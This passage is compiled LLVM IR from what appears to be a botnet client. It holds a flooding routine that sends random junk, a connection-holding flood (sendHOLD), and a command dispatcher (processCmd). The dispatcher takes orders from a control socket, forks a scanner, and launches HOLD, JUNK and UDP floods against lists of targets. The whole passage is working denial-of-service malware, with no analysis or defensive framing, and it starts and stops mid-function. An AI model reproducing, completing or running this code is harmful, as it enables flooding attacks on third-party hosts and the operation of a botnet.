  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %101

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call noalias i8* @malloc(i64 1024) #5
  tail call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 1024, i32 1, i1 false)
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %29 = add nsw i32 %28, %2
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %31 = icmp sgt i32 %29, %30
  br i1 %31, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %32 = icmp sgt i32 %9, 1
  %33 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %34 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %36 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %37 = bitcast i32* %8 to i8*
  %38 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %99
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %39 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %40 = icmp sgt i32 %29, %39
  br i1 %40, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %32, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %99
  %indvars.iv = phi i64 [ %indvars.iv.next, %99 ], [ 0, %.lr.ph.preheader ]
  %41 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %43 = load i8, i8* %42, align 4
  switch i8 %43, label %99 [
    i8 0, label %44
    i8 1, label %60
    i8 2, label %87
  ]

; <label>:44:                                     ; preds = %.lr.ph
  %45 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %46 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  store i32 %45, i32* %46, align 8
  %47 = call i32 (i32, i32, ...) @fcntl(i32 %45, i32 3, i8* null) #5
  %48 = or i32 %47, 2048
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %45, i32 4, i32 %48) #5
  %50 = call i32 @connect(i32 %45, %struct.sockaddr* nonnull %33, i32 16) #5
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %56

; <label>:52:                                     ; preds = %44
  %53 = tail call i32* @__errno_location() #18
  %54 = load i32, i32* %53, align 4
  %55 = icmp eq i32 %54, 115
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52, %44
  %57 = load i32, i32* %46, align 8
  %58 = call i32 @close(i32 %57) #5
  br label %99

; <label>:59:                                     ; preds = %52
  store i8 1, i8* %42, align 4
  br label %99

; <label>:60:                                     ; preds = %.lr.ph
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %34) #5, !srcloc !7
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  %63 = load i32, i32* %62, align 8
  %64 = srem i32 %63, 64
  %65 = zext i32 %64 to i64
  %66 = shl i64 1, %65
  %67 = sdiv i32 %63, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %66, %70
  store i64 %71, i64* %69, align 8
  store i64 0, i64* %35, align 8
  store i64 10000, i64* %36, align 8
  %72 = load i32, i32* %62, align 8
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #5
  switch i32 %74, label %99 [
    i32 1, label %75
    i32 -1, label %84
  ]

; <label>:75:                                     ; preds = %60
  store i32 4, i32* %7, align 4
  %76 = load i32, i32* %62, align 8
  %77 = call i32 @getsockopt(i32 %76, i32 1, i32 4, i8* nonnull %37, i32* nonnull %7) #5
  %78 = load i32, i32* %8, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %83, label %80

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* %62, align 8
  %82 = call i32 @close(i32 %81) #5
  br label %83

; <label>:83:                                     ; preds = %75, %80
  %.sink = phi i8 [ 0, %80 ], [ 2, %75 ]
  store i8 %.sink, i8* %42, align 4
  br label %99

; <label>:84:                                     ; preds = %60
  %85 = load i32, i32* %62, align 8
  %86 = call i32 @close(i32 %85) #5
  store i8 0, i8* %42, align 4
  br label %99

; <label>:87:                                     ; preds = %.lr.ph
  call void @makeRandomStr(i8* %27, i32 1024)
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = call i64 @send(i32 %89, i8* %27, i64 1024, i32 16384) #5
  %91 = icmp eq i64 %90, -1
  br i1 %91, label %92, label %99

; <label>:92:                                     ; preds = %87
  %93 = tail call i32* @__errno_location() #18
  %94 = load i32, i32* %93, align 4
  %95 = icmp eq i32 %94, 11
  br i1 %95, label %99, label %96

; <label>:96:                                     ; preds = %92
  %97 = load i32, i32* %88, align 8
  %98 = call i32 @close(i32 %97) #5
  store i8 0, i8* %42, align 4
  br label %99

; <label>:99:                                     ; preds = %60, %92, %.lr.ph, %59, %56, %84, %83, %96, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %100 = icmp slt i64 %indvars.iv.next, %38
  br i1 %100, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %101

; <label>:101:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) local_unnamed_addr #0 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #5
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %110

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %28 = add nsw i32 %27, %2
  %29 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %31 = icmp sgt i32 %9, 1
  %32 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %36 = bitcast i32* %8 to i8*
  %37 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %38 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %40 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %108
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %41 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %42 = icmp sgt i32 %28, %41
  br i1 %42, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %31, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %108
  %indvars.iv = phi i64 [ %indvars.iv.next, %108 ], [ 0, %.lr.ph.preheader ]
  %43 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %44 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %45 = load i8, i8* %44, align 4
  switch i8 %45, label %108 [
    i8 0, label %46
    i8 1, label %62
    i8 2, label %89
  ]

; <label>:46:                                     ; preds = %.lr.ph
  %47 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %48 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  store i32 %47, i32* %48, align 8
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 3, i8* null) #5
  %50 = or i32 %49, 2048
  %51 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 4, i32 %50) #5
  %52 = call i32 @connect(i32 %47, %struct.sockaddr* nonnull %32, i32 16) #5
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %46
  %55 = tail call i32* @__errno_location() #18
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 115
  br i1 %57, label %61, label %58

; <label>:58:                                     ; preds = %54, %46
  %59 = load i32, i32* %48, align 8
  %60 = call i32 @close(i32 %59) #5
  br label %108

; <label>:61:                                     ; preds = %54
  store i8 1, i8* %44, align 4
  br label %108

; <label>:62:                                     ; preds = %.lr.ph
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #5, !srcloc !8
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = srem i32 %65, 64
  %67 = zext i32 %66 to i64
  %68 = shl i64 1, %67
  %69 = sdiv i32 %65, 64
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %70
  %72 = load i64, i64* %71, align 8
  %73 = or i64 %68, %72
  store i64 %73, i64* %71, align 8
  store i64 0, i64* %34, align 8
  store i64 10000, i64* %35, align 8
  %74 = load i32, i32* %64, align 8
  %75 = add nsw i32 %74, 1
  %76 = call i32 @select(i32 %75, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #5
  switch i32 %76, label %108 [
    i32 1, label %77
    i32 -1, label %86
  ]

; <label>:77:                                     ; preds = %62
  store i32 4, i32* %7, align 4
  %78 = load i32, i32* %64, align 8
  %79 = call i32 @getsockopt(i32 %78, i32 1, i32 4, i8* nonnull %36, i32* nonnull %7) #5
  %80 = load i32, i32* %8, align 4
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %85, label %82

; <label>:82:                                     ; preds = %77
  %83 = load i32, i32* %64, align 8
  %84 = call i32 @close(i32 %83) #5
  br label %85

; <label>:85:                                     ; preds = %77, %82
  %.sink = phi i8 [ 0, %82 ], [ 2, %77 ]
  store i8 %.sink, i8* %44, align 4
  br label %108

; <label>:86:                                     ; preds = %62
  %87 = load i32, i32* %64, align 8
  %88 = call i32 @close(i32 %87) #5
  store i8 0, i8* %44, align 4
  br label %108

; <label>:89:                                     ; preds = %.lr.ph
  %90 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %37) #5, !srcloc !9
  %91 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %92 = load i32, i32* %91, align 8
  %93 = srem i32 %92, 64
  %94 = zext i32 %93 to i64
  %95 = shl i64 1, %94
  %96 = sdiv i32 %92, 64
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %97
  %99 = load i64, i64* %98, align 8
  %100 = or i64 %95, %99
  store i64 %100, i64* %98, align 8
  store i64 0, i64* %38, align 8
  store i64 10000, i64* %39, align 8
  %101 = load i32, i32* %91, align 8
  %102 = add nsw i32 %101, 1
  %103 = call i32 @select(i32 %102, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.timeval* nonnull %6) #5
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %108, label %105

; <label>:105:                                    ; preds = %89
  %106 = load i32, i32* %91, align 8
  %107 = call i32 @close(i32 %106) #5
  store i8 0, i8* %44, align 4
  br label %108

; <label>:108:                                    ; preds = %62, %89, %.lr.ph, %61, %58, %86, %85, %105
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %109 = icmp slt i64 %indvars.iv.next, %40
  br i1 %109, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %110

; <label>:110:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #0 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i64 0, i64 0))
  br label %346

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #5
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.52, i64 0, i64 0), i8* %15)
  br label %346

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.53, i64 0, i64 0)) #15
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %47

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.54, i64 0, i64 0))
  br label %346

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i64 0, i64 0)) #15
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %35

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %346, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %35

; <label>:35:                                     ; preds = %25, %33
  %36 = load i8*, i8** %26, align 8
  %37 = tail call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i64 0, i64 0)) #15
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %35
  %40 = load i32, i32* @scanPid, align 4
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %346

; <label>:42:                                     ; preds = %39
  %43 = tail call i32 @fork() #5
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %46, label %45

; <label>:45:                                     ; preds = %42
  store i32 %43, i32* @scanPid, align 4
  br label %346

; <label>:46:                                     ; preds = %42
  tail call void @StartTheLelz()
  unreachable

; <label>:47:                                     ; preds = %35, %17
  %48 = load i8*, i8** %1, align 8
  %49 = tail call i32 @strcmp(i8* %48, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0)) #15
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %.loopexit173

; <label>:51:                                     ; preds = %47
  %52 = icmp slt i32 %0, 4
  br i1 %52, label %346, label %53

; <label>:53:                                     ; preds = %51
  %54 = getelementptr inbounds i8*, i8** %1, i64 2
  %55 = load i8*, i8** %54, align 8
  %56 = tail call i32 @atoi(i8* %55) #15
  %57 = icmp slt i32 %56, 1
  br i1 %57, label %346, label %58

; <label>:58:                                     ; preds = %53
  %59 = getelementptr inbounds i8*, i8** %1, i64 3
  %60 = load i8*, i8** %59, align 8
  %61 = tail call i32 @atoi(i8* %60) #15
  %62 = icmp slt i32 %61, 1
  br i1 %62, label %346, label %63

; <label>:63:                                     ; preds = %58
  %64 = getelementptr inbounds i8*, i8** %1, i64 1
  %65 = load i8*, i8** %64, align 8
  %strchr = tail call i8* @strchr(i8* %65, i32 44)
  %66 = icmp eq i8* %strchr, null
  br i1 %66, label %79, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i32, i32* @mainCommSock, align 4
  %69 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %68, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i64 0, i64 0), i8* %65, i32 %56, i32 %61)
  br label %70

; <label>:70:                                     ; preds = %73, %67
  %.sink = phi i8* [ %65, %67 ], [ null, %73 ]
  %71 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #5
  %72 = icmp eq i8* %71, null
  br i1 %72, label %.loopexit173.loopexit, label %73

; <label>:73:                                     ; preds = %70
  %74 = tail call i32 @listFork()
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %70

; <label>:76:                                     ; preds = %73
  tail call void @sendHOLD(i8* nonnull %71, i32 %56, i32 %61)
  %77 = load i32, i32* @mainCommSock, align 4
  %78 = tail call i32 @close(i32 %77) #5
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:79:                                     ; preds = %63
  %80 = tail call i32 @listFork()
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %82, label %346

; <label>:82:                                     ; preds = %79
  %83 = load i32, i32* @mainCommSock, align 4
  %84 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %83, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.58, i64 0, i64 0), i8* %65, i32 %56, i32 %61)
  tail call void @sendHOLD(i8* %65, i32 %56, i32 %61)
  %85 = load i32, i32* @mainCommSock, align 4
  %86 = tail call i32 @close(i32 %85) #5
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit173.loopexit:                            ; preds = %70
  br label %.loopexit173

.loopexit173:                                     ; preds = %.loopexit173.loopexit, %47
  %87 = load i8*, i8** %1, align 8
  %88 = tail call i32 @strcmp(i8* %87, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i64 0, i64 0)) #15
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %.loopexit172

; <label>:90:                                     ; preds = %.loopexit173
  %91 = icmp slt i32 %0, 4
  br i1 %91, label %346, label %92

; <label>:92:                                     ; preds = %90
  %93 = getelementptr inbounds i8*, i8** %1, i64 2
  %94 = load i8*, i8** %93, align 8
  %95 = tail call i32 @atoi(i8* %94) #15
  %96 = icmp slt i32 %95, 1
  br i1 %96, label %346, label %97

; <label>:97:                                     ; preds = %92
  %98 = getelementptr inbounds i8*, i8** %1, i64 3
  %99 = load i8*, i8** %98, align 8
  %100 = tail call i32 @atoi(i8* %99) #15
  %101 = icmp slt i32 %100, 1
  br i1 %101, label %346, label %102

; <label>:102:                                    ; preds = %97
  %103 = getelementptr inbounds i8*, i8** %1, i64 1
  %104 = load i8*, i8** %103, align 8
  %strchr160 = tail call i8* @strchr(i8* %104, i32 44)
  %105 = icmp eq i8* %strchr160, null
  br i1 %105, label %118, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i64 0, i64 0), i8* %104, i32 %95, i32 %100)
  br label %109

; <label>:109:                                    ; preds = %112, %106
  %.sink164 = phi i8* [ %104, %106 ], [ null, %112 ]
  %110 = tail call i8* @strtok(i8* %.sink164, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #5
  %111 = icmp eq i8* %110, null
  br i1 %111, label %.loopexit172.loopexit, label %112

; <label>:112:                                    ; preds = %109
  %113 = tail call i32 @listFork()
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %115, label %109

; <label>:115:                                    ; preds = %112
  tail call void @sendJUNK(i8* nonnull %110, i32 %95, i32 %100)
  %116 = load i32, i32* @mainCommSock, align 4
  %117 = tail call i32 @close(i32 %116) #5
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:118:                                    ; preds = %102
  %119 = tail call i32 @listFork()
  %120 = icmp eq i32 %119, 0
  br i1 %120, label %121, label %346

; <label>:121:                                    ; preds = %118
  %122 = load i32, i32* @mainCommSock, align 4
  %123 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %122, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i64 0, i64 0), i8* %104, i32 %95, i32 %100)
  tail call void @sendJUNK(i8* %104, i32 %95, i32 %100)
  %124 = load i32, i32* @mainCommSock, align 4
  %125 = tail call i32 @close(i32 %124) #5
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit172.loopexit:                            ; preds = %109
  br label %.loopexit172

.loopexit172:                                     ; preds = %.loopexit172.loopexit, %.loopexit173
  %126 = load i8*, i8** %1, align 8
  %127 = tail call i32 @strcmp(i8* %126, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i64 0, i64 0)) #15
  %128 = icmp eq i32 %127, 0
  br i1 %128, label %129, label %.loopexit171

; <label>:129:                                    ; preds = %.loopexit172
  %130 = icmp slt i32 %0, 6
  br i1 %130, label %346, label %131

; <label>:131:                                    ; preds = %129
  %132 = getelementptr inbounds i8*, i8** %1, i64 3
  %133 = load i8*, i8** %132, align 8
  %134 = tail call i32 @atoi(i8* %133) #15
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %346, label %136

; <label>:136:                                    ; preds = %131
  %137 = getelementptr inbounds i8*, i8** %1, i64 2
  %138 = load i8*, i8** %137, align 8
  %139 = tail call i32 @atoi(i8* %138) #15
  %140 = icmp eq i32 %139, -1
  br i1 %140, label %346, label %141

; <label>:141:                                    ; preds = %136
  %142 = getelementptr inbounds i8*, i8** %1, i64 4
  %143 = load i8*, i8** %142, align 8
  %144 = tail call i32 @atoi(i8* %143) #15
  %145 = icmp eq i32 %144, -1
  br i1 %145, label %346, label %146

; <label>:146:                                    ; preds = %141
  %147 = getelementptr inbounds i8*, i8** %1, i64 5
  %148 = load i8*, i8** %147, align 8
  %149 = tail call i32 @atoi(i8* %148) #15
  %150 = icmp eq i32 %149, -1
  %151 = icmp sgt i32 %149, 65500
  %or.cond = or i1 %150, %151
  %152 = icmp sgt i32 %144, 32
  %or.cond165 = or i1 %152, %or.cond
  br i1 %or.cond165, label %346, label %153

; <label>:153:                                    ; preds = %146
  %154 = icmp eq i32 %0, 7
  br i1 %154, label %155, label %160

; <label>:155:                                    ; preds = %153
  %156 = getelementptr inbounds i8*, i8** %1, i64 6
  %157 = load i8*, i8** %156, align 8
  %158 = tail call i32 @atoi(i8* %157) #15
  %159 = icmp slt i32 %158, 1
  br i1 %159, label %346, label %160

; <label>:160:                                    ; preds = %155, %153
  %161 = getelementptr inbounds i8*, i8** %1, i64 1
  %162 = load i8*, i8** %161, align 8
  %163 = load i8*, i8** %137, align 8
  %164 = tail call i32 @atoi(i8* %163) #15
  %165 = load i8*, i8** %132, align 8
  %166 = tail call i32 @atoi(i8* %165) #15
  %167 = load i8*, i8** %142, align 8
  %168 = tail call i32 @atoi(i8* %167) #15
  %169 = load i8*, i8** %147, align 8
  %170 = tail call i32 @atoi(i8* %169) #15
  br i1 %154, label %171, label %175

; <label>:171:                                    ; preds = %160
  %172 = getelementptr inbounds i8*, i8** %1, i64 6
  %173 = load i8*, i8** %172, align 8
  %174 = tail call i32 @atoi(i8* %173) #15
  br label %175

; <label>:175:                                    ; preds = %160, %171
  %176 = phi i32 [ %174, %171 ], [ 10, %160 ]
  %strchr161 = tail call i8* @strchr(i8* %162, i32 44)
  %177 = icmp eq i8* %strchr161, null
  br i1 %177, label %190, label %178

; <label>:178:                                    ; preds = %175
  %179 = load i32, i32* @mainCommSock, align 4
  %180 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %179, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.62, i64 0, i64 0), i8* %162, i32 %166)
  br label %181

; <label>:181:                                    ; preds = %184, %178
  %.sink166 = phi i8* [ %162, %178 ], [ null, %184 ]
  %182 = tail call i8* @strtok(i8* %.sink166, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #5
  %183 = icmp eq i8* %182, null
  br i1 %183, label %.loopexit171.loopexit, label %184

; <label>:184:                                    ; preds = %181
  %185 = tail call i32 @listFork()
  %186 = icmp eq i32 %185, 0
  br i1 %186, label %187, label %181

; <label>:187:                                    ; preds = %184
  tail call void @sendUDP(i8* nonnull %182, i32 %164, i32 %166, i32 %168, i32 %170, i32 %176)
  %188 = load i32, i32* @mainCommSock, align 4
  %189 = tail call i32 @close(i32 %188) #5
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:190:                                    ; preds = %175
  %191 = tail call i32 @listFork()
  %192 = icmp eq i32 %191, 0
  br i1 %192, label %193, label %346

; <label>:193:                                    ; preds = %190
  %194 = load i32, i32* @mainCommSock, align 4
  %195 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %194, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.63, i64 0, i64 0), i8* %162, i32 %164, i32 %166)
  tail call void @sendUDP(i8* %162, i32 %164, i32 %166, i32 %168, i32 %170, i32 %176)
  %196 = load i32, i32* @mainCommSock, align 4
  %197 = tail call i32 @close(i32 %196) #5
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit171.loopexit:                            ; preds = %181
  br label %.loopexit171

.loopexit171:                                     ; preds = %.loopexit171.loopexit, %.loopexit172
  %198 = load i8*, i8** %1, align 8
  %199 = tail call i32 @strcmp(i8* %198, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i64 0, i64 0)) #15
  %200 = icmp eq i32 %199, 0
  br i1 %200, label %201, label %.loopexit170

; <label>:201:                                    ; preds = %.loopexit171
